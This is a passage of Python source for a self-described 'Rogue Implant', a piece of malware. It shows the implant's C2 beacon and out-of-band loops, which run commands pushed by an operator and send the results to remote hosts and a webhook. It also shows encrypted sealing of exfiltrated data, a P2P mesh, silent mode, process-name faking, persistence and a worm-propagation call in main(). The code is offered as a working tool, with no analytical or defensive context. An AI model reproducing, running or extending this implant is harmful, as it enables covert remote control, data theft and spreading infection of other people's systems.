                    self._exec_command(content.strip())
                return
            self._oob_seen.add(inner.get("ts"))
            cmd = inner.get("o") or inner.get("command")
            if cmd:
                print("[OOB] command: %s" % cmd)
                self._exec_command(cmd)
        except Exception as e:
            print("[OOB] poll error: %s" % e)

    def _exec_command(self, cmd):
        try:
            result = handle_command(cmd)
        except Exception as e:
            result = "[!] %s" % e
        if not result:
            result = "[!] no result"
        self.post_result(str(result))

    def post_result(self, text):
        """Send a command result toward the C2: http/dns tiers first, then webhook."""
        try:
            resp = self.roundtrip({"o": "result:%s" % text[:4000]})
            if resp is not None:
                return True
        except Exception:
            pass
        if self.cfg.get("oob_webhook"):
            try:
                c = self._ensure_client()
                raw = c.seal_op({"o": "result:%s" % text[:4000]})
                body = base64.b64encode(raw).decode()
                req = urllib.request.Request(self.cfg["oob_webhook"],
                                             data=json.dumps({"content": body}).encode(),
                                             headers={"Content-Type": "application/json"},
                                             method="POST")
                urllib.request.urlopen(req, timeout=15)
                return True
            except Exception:
                pass
        return False


def v2_beacon_loop(comms, silent_mode=False):
    """Main v3.3 beacon: layered tiers, jittered backoff, command exec."""
    count = 0
    last_gw_update = 0
    while True:
        count += 1
        ok_ts = comms._http_ok_ts
        resp = comms.roundtrip({
            "o": "beacon",
            "mesh": {"gw": comms._gw_ok, "peers": comms.mesh_peer_count()},
        })
        if resp is None:
            # total outage: exponential backoff 60 -> 300s w/ jitter
            delay = min(300, 60 * (2 ** min(comms._fail_streak // 3, 3)))
            delay = delay * (0.8 + 0.4 * random.random())
            if not silent_mode:
                print("[V2] all tiers down - next attempt in %ds" % delay)
            time.sleep(delay)
            continue
        # periodic gateway flag update (cheap)
        if time.time() - last_gw_update > 60 or (ok_ts != comms._http_ok_ts):
            comms.update_gw(comms._http_ok_ts > time.time() - 120)
            last_gw_update = time.time()
        op = resp.get("o", "pong")
        peers = resp.get("peers")
        if peers:
            comms.merge_peers(peers)
        if op == "pong" or op.startswith("__hello"):
            pass
        elif op.startswith("result:"):
            pass
        elif op.startswith("identified:"):
            pass
        else:
            if not silent_mode:
                print("[V2] command: %s" % op[:80])
            try:
                result = handle_command(op)
            except Exception as e:
                result = "[!] %s" % e
            if result:
                comms.post_result(str(result)[:4000])
        # jittered sleep 25-40s (reduced when http tier is the live one)
        base = 25 if comms._http_ok_ts > time.time() - 90 else 30
        time.sleep(base * (0.8 + 0.4 * random.random()))


def v2_oob_loop(comms, silent_mode=False):
    """Poll the OOB channel for operator-pushed commands (30s)."""
    while True:
        try:
            comms.oob_poll_once()
        except Exception:
            pass
        time.sleep(30)


def v2_start(silent_mode=False):
    """Start the v3.3 comms stack. Returns True if v2 is running."""
    if not V2_ENABLED:
        return False
    if not silent_mode:
        print("[V2] layered comms enabled (secret+%s hosts, dns=%s)"
              % (len(ROGUE_V2_CFG.get("c2_hosts") or []),
                 bool(ROGUE_V2_CFG.get("dns_zone"))))
    comms = V2Comms(ROGUE_V2_CFG)
    comms.start_mesh()   # always-on P2P (encrypted), even with direct C2 up
    if not silent_mode:
        print("[V2] P2P mesh listener active (label %s)" % V2_LABEL[:12])
    threading.Thread(target=v2_oob_loop, args=(comms, silent_mode), daemon=True).start()
    threading.Thread(target=v2_beacon_loop, args=(comms, silent_mode), daemon=True).start()
    return True


# v2-aware shims so existing call sites (cloud detect etc.) use v2 when active
_V2_COMMS_SINGLETON = {}


def _get_v2_comms():
    if V2_ENABLED and "_c" not in _V2_COMMS_SINGLETON:
        _V2_COMMS_SINGLETON["_c"] = V2Comms(ROGUE_V2_CFG)
    return _V2_COMMS_SINGLETON.get("_c")


def send_https_command_v2(cmd_str):
    """v2 replacement for legacy send_https_command(cmd) call sites."""
    comms = _get_v2_comms()
    if not comms:
        return "[!] v2 not configured"
    resp = comms.roundtrip({"o": cmd_str})
    if resp is None:
        return "[!] Connection failed (all tiers)"
    return resp.get("o", "pong")



def rv2i_exfil_seal(data):
    """Seal exfil bytes to the C2 static key (R2EX format, X25519+AEAD)."""
    pub_b64 = ROGUE_V2_CFG.get("static_pub")
    if not pub_b64 or not _RV2_HAS_ECDH:
        return None
    try:
        pub_raw = rv2_b64d(pub_b64)
        eph_priv, eph_pub = rv2_gen_static_key()
        salt = rv2_rand(16)
        shared = rv2_x25519_shared(eph_priv, pub_raw)
        master = rv2_hkdf(shared, salt, b"rogue-v2-kex|" + eph_pub + pub_raw, 32)
        key = rv2_hkdf(master, b"", b"rogue-v2-exfil", 32)
        nonce = rv2_rand(12)
        ct, tag = rv2_aead_encrypt(key, nonce, data, b"rogue-v2-exfil")
        # all fields base64: raw ciphertext may contain the '|' separator byte
        return b"R2EX|" + rv2_b64e(eph_pub).encode() + b"|" + rv2_b64e(salt).encode() \
            + b"|" + rv2_b64e(nonce).encode() + b"|" + rv2_b64e(tag).encode() + b"|" + rv2_b64e(ct).encode()
    except Exception:
        return None

# === Main Function ===
def main():
    """Main entry point with smart silent mode and cloud awareness"""
    silent_mode = should_run_silently()
    
    cleanup_old_persistence()
    
    if silent_mode:
        print(f"[+] Rogue Implant starting in silent mode...")
        redirect_output_to_log()
    else:
        print("[+] Rogue Implant starting...")
        print(f"[+] C2 Target: {C2_HOST}:{C2_PORT}")
        print(f"[+] Payload Repo: {PAYLOAD_REPO}")
        print(f"[+] Implant ID: {IMPLANT_ID_HASH}")
    
    # CLOUD DETECTION AND ADAPTATION
    print("[+] Detecting cloud environment...")
    cloud_info = cloud_implant.detect_environment()
    
    if cloud_info.get('is_cloud'):
        provider = cloud_info.get('provider', 'unknown').upper()
        print(f"[CLOUD] Detected: {provider} environment")
        
        # Adapt hidden directory for cloud
        global HIDDEN_DIR
        new_hidden_dir = cloud_implant.adapt_hidden_dir()
        if new_hidden_dir != HIDDEN_DIR:
            HIDDEN_DIR = new_hidden_dir
            os.makedirs(HIDDEN_DIR, exist_ok=True)
            print(f"[CLOUD] Adapted hidden directory to: {HIDDEN_DIR}")
        
        # Fetch cloud-specific payloads
        print("[CLOUD] Fetching cloud-specific payloads...")
        cloud_payloads = cloud_implant.fetch_cloud_payloads()
        
        # Send cloud detection to C2
        if not silent_mode:
            try:
                cloud_report = {
                    'provider': cloud_info.get('provider'),
                    'type': cloud_info.get('type'),
                    'implant_id': IMPLANT_ID_HASH,
                    'timestamp': time.time()
                }
                send_https_command(f"cloud_detected:{json.dumps(cloud_report)}")
            except:
                pass
    else:
        print("[CLOUD] No cloud environment detected")
    
    if silent_mode and os.isatty(0):
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    
    fake_name()
    
    # Use cloud-aware persistence
    if cloud_info.get('is_cloud'):
        cloud_implant.adapt_persistence()
    else:
        setup_persistence()
    
    worm_propagate()

    # V3.3: layered comms (https -> dns -> p2p mesh -> oob) when configured
    if V2_ENABLED and v2_start(silent_mode):
        if not silent_mode:
            print("[+] V3.3 layered comms operational (https/dns/p2p/oob)")
        while True:
            time.sleep(60)
    
    # Legacy single-channel mode (no v2 config present)
    threading.Thread(target=p2p_listener, daemon=True).start()
    threading.Thread(target=p2p_broadcast, daemon=True).start()
    threading.Thread(target=discord_loop, daemon=True).start()
    
    if not silent_mode:
        print("[+] All systems operational. Starting beacon...")
    
    beacon()

# === Launch ===
if __name__ == "__main__":
    main()
